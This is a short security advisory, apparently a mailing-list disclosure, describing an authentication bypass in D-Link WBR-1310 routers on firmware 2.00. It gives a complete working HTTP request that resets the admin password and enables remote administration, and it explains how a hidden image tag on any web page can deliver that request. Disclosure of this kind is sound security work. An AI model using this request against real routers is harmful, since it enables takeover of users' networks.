Subject: D-Link WBR-1310 Authentication Bypass
	Vulnerability

The CGI scripts in the WBR-1310 (firmware v.2.00) do not validate
authentication credentials. Administrative settings can be changed by
sending the appropriate HTTP request directly to a CGI script without
authenticating to the device.

The following request will change the administrative password to 'hacked'
and enable remote administration on port 8080:
http://192.168.0.1/tools_admin.cgi?admname=admin&admPass1=hacked&admPass2=hacked&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1

Even if remote administration is not enabled, any Web page that any internal
user browses to can change the administrator password and enable remote
administration via a hidden image tag embedded in the Web page. No
Javascript required.

Newer versions of the WBR-1310 firmware are not vulnerable, but since
version 2.00 is the default firmware, most WBR-1310 routers are still
running it.
